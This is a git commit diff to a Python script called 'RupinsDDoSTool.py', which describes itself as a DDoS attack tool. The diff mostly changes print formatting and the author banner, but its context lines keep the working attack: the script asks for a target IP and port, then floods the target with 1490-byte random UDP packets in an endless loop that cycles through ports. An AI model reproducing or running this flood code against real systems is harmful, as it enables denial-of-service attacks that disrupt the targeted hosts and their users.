13d4eaf383ce80faf53961bb7f88920e61ed9ba3
Q999777 <63502192+Q999777@users.noreply.github.com>
2020-04-21 18:35:27 -0500

    Update RupinsDDoSTool.py

--- RupinsDDoSTool.py
+++ RupinsDDoSTool.py
@@ -20,34 +20,30 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print ("------------------------------------------------")
-print ("--__----__----__----__----__----__----__----__--")
-print ("--__----__----__----__----__----__----__----__--")
-print ("Author   : Jaden/BlackCrow")
-print ("Rupins DDoS tool--__----__----__----__----__--")
-print ("--__----__----__----__----__----__----__----__--")
-print ("------------------------------------------------")
+print "Author   : Jaden"
+print "For   : Rupin"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print ("[Loading, Rupin wait a few   ] 0% ")
+print "[                    ] 0% "
 time.sleep(5)
-print ("[=====               ] 25%")
+print "[=====               ] 25%"
 time.sleep(5)
-print ("[==========          ] 50%")
+print "[==========          ] 50%"
 time.sleep(5)
-print ("[===============     ] 75%")
+print "[===============     ] 75%"
 time.sleep(5)
-print ("[====================] 100%")
+print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port)")
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
+
